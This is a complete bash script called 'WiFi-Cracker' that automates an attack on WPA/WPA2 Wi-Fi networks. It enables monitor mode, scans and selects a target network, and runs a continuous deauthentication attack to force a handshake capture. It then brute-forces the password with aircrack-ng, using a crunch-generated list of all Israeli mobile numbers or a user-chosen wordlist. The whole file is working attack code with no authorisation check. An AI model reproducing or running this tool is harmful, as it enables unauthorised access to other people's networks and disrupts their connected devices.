#!/bin/bash

# Colors for output
RED='\033[1;91m'      # Bright Red
GREEN='\033[1;92m'    # Bright Green
BLUE='\033[1;94m'     # Bright Blue
YELLOW='\033[1;93m'   # Bright Yellow
PURPLE='\033[1;95m'   # Bright Purple
CYAN='\033[1;96m'     # Bright Cyan
WHITE='\033[1;97m'    # Bright White
NC='\033[0m'          # No Color

# Banner
print_banner() {
    echo -e "${PURPLE}"
    figlet -f slant "WiFi-Cracker"
    echo -e "${NC}"
    echo -e "${CYAN}Automated WPA/WPA2 Handshake Capture and Password Cracking Tool${NC}\n"
}

# Check for root privileges
check_root() {
    if [ "$EUID" -ne 0 ]; then
        echo -e "${RED}[!] This script must be run as root${NC}"
        exit 1
    fi
}

# Check and install dependencies
check_dependencies() {
    echo -e "${BLUE}[*] Checking dependencies...${NC}"
    
    # List of required tools
    local tools=(
        "aircrack-ng"
        "crunch"
        "xterm"
        "figlet"
    )
    
    local missing=()
    
    # Check each tool
    for tool in "${tools[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            missing+=("$tool")
        fi
    done
    
    # Install missing tools
    if [ ${#missing[@]} -gt 0 ]; then
        # Update package list
        apt-get update > /dev/null 2>&1
        
        # Install tools
        for tool in "${missing[@]}"; do
            apt-get install -y "$tool" > /dev/null 2>&1
        done
    fi
    
    echo -e "${GREEN}[+] All required tools are installed${NC}"
}

# Get and setup wireless interface
setup_interface() {
    echo -e "${BLUE}[*] Checking wireless interfaces...${NC}"
    
    # Get wireless interface
    WIRELESS_INTERFACE=$(iwconfig 2>/dev/null | grep -o '^[[:alnum:]]\+' | head -n 1)
    
    if [ -z "$WIRELESS_INTERFACE" ]; then
        echo -e "${RED}[!] No wireless interface found${NC}"
        exit 1
    fi
    
    echo -e "${GREEN}[+] Found wireless interface: ${WHITE}$WIRELESS_INTERFACE${NC}"
    
    # Kill interfering processes
    echo -e "${BLUE}[*] Killing interfering processes...${NC}"
    airmon-ng check kill > /dev/null 2>&1
    
    # Enable monitor mode
    echo -e "${BLUE}[*] Enabling monitor mode...${NC}"
    airmon-ng start "$WIRELESS_INTERFACE" > /dev/null 2>&1
    
    # Get the monitor interface name (might be different from original)
    MONITOR_INTERFACE=$(iwconfig 2>/dev/null | grep -o '^[[:alnum:]]\+' | head -n 1)
    
    if [ -z "$MONITOR_INTERFACE" ]; then
        echo -e "${RED}[!] Failed to enable monitor mode${NC}"
        exit 1
    fi
    
    # Verify monitor mode is enabled
    if ! iwconfig "$MONITOR_INTERFACE" 2>/dev/null | grep -q "Mode:Monitor"; then
        echo -e "${RED}[!] Failed to verify monitor mode${NC}"
        exit 1
    fi
    
    echo -e "${GREEN}[+] Monitor mode enabled on: ${WHITE}$MONITOR_INTERFACE${NC}"
    return 0
}

# Scan for networks
scan_networks() {
    echo -e "\n${BLUE}[*] Starting network scan...${NC}"
    echo -e "${YELLOW}[*] Scanning for 10 seconds...${NC}\n"
    
    # Create temporary directory for scan results
    TEMP_DIR=$(mktemp -d)
    SCAN_FILE="$TEMP_DIR/scan"
    
    # Start scanning in background
    airodump-ng -w "$SCAN_FILE" --output-format csv $MONITOR_INTERFACE > /dev/null 2>&1 &
    SCAN_PID=$!
    
    # Wait for 10 seconds
    sleep 10
    
    # Kill the scan process
    kill $SCAN_PID 2>/dev/null
    
    # Give a moment for the file to be written
    sleep 2
    
    # Process scan results
    if [ -f "$SCAN_FILE-01.csv" ]; then
        echo -e "\n${BLUE}[*] Processing scan results...${NC}\n"
        echo -e "${PURPLE}Available Networks:${NC}"
        echo -e "${WHITE}ID\tNetwork Name${NC}"
        echo -e "${WHITE}----------------------------------------${NC}"
        
        # Store networks in an array for later use
        declare -a NETWORKS
        awk -F ',' '
        NR > 2 {
            if ($1 ~ /^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$/) {
                # Clean up ESSID
                essid = $14
                gsub(/^"|"$/, "", essid)
                gsub(/^[[:space:]]+|[[:space:]]+$/, "", essid)  # Remove leading/trailing whitespace
                
                # Only process if ESSID is not empty and contains visible characters
                if (essid != "" && essid ~ /[[:graph:]]/ && essid !~ /^[[:space:]]*$/) {
                    # Store network info
                    networks[++count] = $1 "," $4 "," $8 "," essid
                    
                    # Display network
                    printf "%d\t%s\n", count, essid
                }
            }
        }
        END {
            for (i = 1; i <= count; i++) {
                print networks[i] > "'"$TEMP_DIR/networks.txt"'"
            }
        }' "$SCAN_FILE-01.csv" | grep -v '^$'  # Remove empty lines
        
        # Read networks from the temporary file
        while IFS=, read -r bssid channel enc essid; do
            NETWORKS+=("$bssid,$channel,$enc,$essid")
        done < "$TEMP_DIR/networks.txt"
        
        # Get target selection with retry
        while true; do
            echo -e "\n${YELLOW}[?] Select target network (1-${#NETWORKS[@]}):${NC} "
            read -r TARGET_NUM
            
            # Check if input is a number
            if ! [[ "$TARGET_NUM" =~ ^[0-9]+$ ]]; then
                echo -e "${RED}[!] Please enter a number between 1 and ${#NETWORKS[@]}${NC}"
                continue
            fi
            
            # Validate selection
            if [ "$TARGET_NUM" -gt 0 ] && [ "$TARGET_NUM" -le "${#NETWORKS[@]}" ]; then
                # Get selected network info
                IFS=, read -r TARGET_BSSID TARGET_CHANNEL TARGET_ENC TARGET_ESSID <<< "${NETWORKS[$((TARGET_NUM-1))]}"
                echo -e "${GREEN}[+] Target: ${WHITE}$TARGET_ESSID${GREEN} (${WHITE}$TARGET_BSSID${GREEN}) on channel ${WHITE}$TARGET_CHANNEL${NC}"
                break
            else
                echo -e "${RED}[!] Invalid selection. Please enter a number between 1 and ${#NETWORKS[@]}${NC}"
            fi
        done
        
        # Clean up
        rm -rf "$TEMP_DIR"
    else
        echo -e "${RED}[!] No networks found${NC}"
        return 1
    fi
}

# Cleanup function
cleanup() {
    echo -e "\n${BLUE}[*] Cleaning up...${NC}"
    
    # Stop monitor mode
    echo -e "${YELLOW}[*] Stopping monitor mode...${NC}"
    airmon-ng stop "$MONITOR_INTERFACE" > /dev/null 2>&1
    
    # Start NetworkManager service
    echo -e "${YELLOW}[*] Starting NetworkManager service...${NC}"
    systemctl start NetworkManager > /dev/null 2>&1
    
    # Kill any remaining processes
    killall xterm 2>/dev/null
    pkill -f "airodump-ng" 2>/dev/null
    pkill -f "aireplay-ng" 2>/dev/null
    
    echo -e "${GREEN}[+] Cleanup complete${NC}"
}

# Capture handshake
capture_handshake() {
    echo -e "\n${BLUE}[*] Starting handshake capture...${NC}"
    
    # Create directory for handshake files
    mkdir -p handshakes
    CAPTURE_FILE="handshakes/handshake_${TARGET_ESSID}_$(date +%Y%m%d_%H%M%S)"
    
    # Create a temporary script to maintain color
    TEMP_SCRIPT=$(mktemp)
    cat > "$TEMP_SCRIPT" << 'EOF'
#!/bin/bash
echo -e "\033[1;95mCapturing handshake for $1...\033[0m"
airodump-ng -c $2 --bssid $3 -w "$4" $5 | while read -r line; do
    echo -e "\033[1;95m$line\033[0m"
done
EOF
    chmod +x "$TEMP_SCRIPT"
    
    # Start airodump-ng to capture handshake
    echo -e "${YELLOW}[*] Listening for handshake...${NC}"
    xterm -geometry 100x25+0+0 -fg purple -T "Handshake Capture" -e \
        "$TEMP_SCRIPT \"$TARGET_ESSID\" \"$TARGET_CHANNEL\" \"$TARGET_BSSID\" \"$CAPTURE_FILE\" \"$MONITOR_INTERFACE\"" &
    AIRODUMP_PID=$!
    
    # Wait a moment for airodump-ng to start
    sleep 2
    
    # Start deauth attack
    echo -e "${YELLOW}[*] Starting deauth attack...${NC}"
    xterm -geometry 80x20+0+500 -fg cyan -T "Deauth Attack" -e \
        "echo -e '\033[1;96mRunning deauth attack on $TARGET_ESSID...\033[0m'; aireplay-ng --deauth 0 -a $TARGET_BSSID $MONITOR_INTERFACE" &
    AIREPLAY_PID=$!
    
    # Monitor for handshake capture or window closure
    while true; do
        # Check if either process has died (window closed)
        if ! kill -0 $AIRODUMP_PID 2>/dev/null || ! kill -0 $AIREPLAY_PID 2>/dev/null; then
            echo -e "${RED}[!] Capture window was closed. Exiting...${NC}"
            rm -f "$TEMP_SCRIPT"
            cleanup
            exit 1
        fi

        # Check for handshake
        if [ -f "${CAPTURE_FILE}-01.cap" ]; then
            if aircrack-ng "${CAPTURE_FILE}-01.cap" 2>/dev/null | grep -q "1 handshake"; then
                echo -e "${GREEN}[+] Handshake captured!${NC}"
                
                # Kill processes and close xterm windows
                kill $AIRODUMP_PID 2>/dev/null
                kill $AIREPLAY_PID 2>/dev/null
                killall xterm 2>/dev/null
                pkill -f "airodump-ng.*$CAPTURE_FILE" 2>/dev/null
                pkill -f "aireplay-ng.*$TARGET_BSSID" 2>/dev/null
                rm -f "$TEMP_SCRIPT"
                
                echo -e "${GREEN}[+] Handshake saved to: ${WHITE}${CAPTURE_FILE}-01.cap${NC}"
                break
            fi
        fi
        sleep 1
    done
}

# Format aircrack output
format_aircrack_output() {
    local found_password=0
    while IFS= read -r line; do
        if [[ "$line" == *"KEY FOUND!"* ]]; then
            # Extract password using precise grep pattern
            password=$(echo "$line" | grep -oP 'KEY FOUND! \[\K[^]]*')
            echo -e "\n${GREEN}[+] Password found: ${WHITE}$password${NC}"
            found_password=1
            return 0
        elif [[ "$line" == *"keys tested"* ]]; then
            progress=$(echo "$line" | grep -o '[0-9.]*%' | head -n1)
            if [[ "$progress" == "100%" ]]; then
                echo -ne "\r${YELLOW}[*] Progress: ${WHITE}100%${NC}"
            else
                echo -ne "\r${YELLOW}[*] Progress: ${WHITE}$progress${NC}"
            fi
        fi
    done
    
    if [ $found_password -eq 0 ]; then
        echo -e "\n${RED}[!] Password not found, try different wordlist${NC}"
        return 1
    fi
}

# Generate Israeli phone numbers wordlist
generate_phone_wordlist() {
    echo -e "\n${BLUE}[*] Generating Israeli Phone-Numbers Wordlist...${NC}"
    local wordlist_file="wordlists/Israeli_Phone_Numbers.txt"
    mkdir -p wordlists
    
    # Generate phone numbers for each prefix
    echo -e "${YELLOW}[*] Generating phone numbers (this may take a time)...${NC}"
    crunch 10 10 -t 050%%%%%%% >> "$wordlist_file" 2>/dev/null
    crunch 10 10 -t 052%%%%%%% >> "$wordlist_file" 2>/dev/null
    crunch 10 10 -t 053%%%%%%% >> "$wordlist_file" 2>/dev/null
    crunch 10 10 -t 054%%%%%%% >> "$wordlist_file" 2>/dev/null
    crunch 10 10 -t 055%%%%%%% >> "$wordlist_file" 2>/dev/null
    crunch 10 10 -t 058%%%%%%% >> "$wordlist_file" 2>/dev/null
    
    if [ -f "$wordlist_file" ]; then
        echo -e "${GREEN}[+] Wordlist generated: ${WHITE}$wordlist_file${NC}"
        echo -e "${YELLOW}[*] Starting password cracking...${NC}"
        aircrack-ng -w "$wordlist_file" "${CAPTURE_FILE}-01.cap" 2>/dev/null | format_aircrack_output
    else
        echo -e "${RED}[!] Failed to generate wordlist${NC}"
    fi
}

# Use custom wordlist
use_custom_wordlist() {
    while true; do
        echo -e "\n${YELLOW}[?] Enter wordlist name or path (must end with .txt):${NC} "
        read -r wordlist_name
        
        # Check if the input is a direct path
        if [[ "$wordlist_name" == /* ]]; then
            if [ -f "$wordlist_name" ]; then
                if [[ "$wordlist_name" != *.txt ]]; then
                    echo -e "${RED}[!] Wordlist must end with .txt${NC}"
                    continue
                fi
                echo -e "${GREEN}[+] Using wordlist: ${WHITE}$wordlist_name${NC}"
                selected_wordlist="$wordlist_name"
                break
            else
                echo -e "${RED}[!] File not found: ${WHITE}$wordlist_name${NC}"
                continue
            fi
        fi
        
        # Find all matching files
        local matches=()
        while IFS= read -r -d '' file; do
            # Skip system directories to speed up search
            if [[ "$file" != */usr/lib/* && "$file" != */usr/share/doc/* ]]; then
                if [[ "$file" == *.txt ]]; then
                    matches+=("$file")
                fi
            fi
        done < <(find /home /root /usr/share/wordlists -name "*$wordlist_name*" -type f -print0 2>/dev/null)
        
        if [ ${#matches[@]} -eq 0 ]; then
            echo -e "${RED}[!] No matching .txt wordlists found. Please try again.${NC}"
            continue
        elif [ ${#matches[@]} -eq 1 ]; then
            # If only one match found, use it directly
            local selected_wordlist="${matches[0]}"
            echo -e "${GREEN}[+] Using wordlist: ${WHITE}$selected_wordlist${NC}"
            break
        else
            # If multiple matches found, let user choose
            echo -e "\n${BLUE}[*] Multiple wordlists found:${NC}"
            for i in "${!matches[@]}"; do
                echo -e "${WHITE}$((i+1))) ${matches[$i]}${NC}"
            done
            
            while true; do
                echo -e "\n${YELLOW}[?] Select a wordlist (1-${#matches[@]}):${NC} "
                read -r choice
                
                # Check if input is a number
                if ! [[ "$choice" =~ ^[0-9]+$ ]]; then
                    echo -e "${RED}[!] Please enter a number between 1 and ${#matches[@]}${NC}"
                    continue
                fi
                
                if [ "$choice" -gt 0 ] && [ "$choice" -le "${#matches[@]}" ]; then
                    local selected_wordlist="${matches[$((choice-1))]}"
                    echo -e "${GREEN}[+] Using wordlist: ${WHITE}$selected_wordlist${NC}"
                    break 2
                else
                    echo -e "${RED}[!] Invalid selection. Please enter a number between 1 and ${#matches[@]}${NC}"
                fi
            done
        fi
    done
    
    # Run aircrack-ng with the selected wordlist
    echo -e "${YELLOW}[*] Starting password cracking...${NC}"
    aircrack-ng -w "$selected_wordlist" "${CAPTURE_FILE}-01.cap" 2>/dev/null | format_aircrack_output
}

# Show cracking menu
show_cracking_menu() {
    while true; do
        echo -e "\n${BLUE}[*] Choose a cracking method:${NC}"
        echo -e "${WHITE}1) Generate and use Israeli phone numbers wordlist${NC}"
        echo -e "${WHITE}2) Use custom wordlist (.txt only)${NC}"
        echo -e "${WHITE}3) Exit${NC}"
        echo -e "\n${YELLOW}[?] Select an option (1-3):${NC} "
        read -r choice
        
        case $choice in
            1)
                generate_phone_wordlist
                break
                ;;
            2)
                use_custom_wordlist
                break
                ;;
            3)
                echo -e "${BLUE}[*] Exiting...${NC}"
                break
                ;;
            *)
                echo -e "${RED}[!] Invalid option. Please try again.${NC}"
                ;;
        esac
    done
}

# Main function
main() {
    clear
    print_banner
    check_root
    check_dependencies
    setup_interface
    scan_networks
    capture_handshake
    
    show_cracking_menu
    
    # Cleanup before exiting
    cleanup
}

# Run main function
main

# Footer
echo -e "\n${PURPLE}For more interesting scripts visit: https://github.com/liorbm${NC}"
